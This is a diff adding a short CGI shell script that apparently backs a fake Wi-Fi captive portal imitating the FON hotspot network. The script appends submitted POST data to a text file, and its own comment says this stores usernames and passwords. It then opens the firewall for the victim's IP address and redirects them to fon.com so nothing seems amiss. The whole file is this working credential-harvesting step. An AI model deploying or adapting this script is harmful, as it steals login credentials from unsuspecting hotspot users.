@@ -1,0 +1,19 @@
+#!/bin/sh
+
+echo "Status: 200 OK"
+echo ""
+
+#store username and password in file
+read POST
+echo "$POST" >> file.txt
+
+
+#allow user
+iptables -t nat -I prerouting_lan 1 -s $REMOTE_ADDR -j ACCEPT
+
+#redirect
+echo "<html>"
+echo -e "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL=http://www.fon.com\">"
+echo "</html>"
+
+
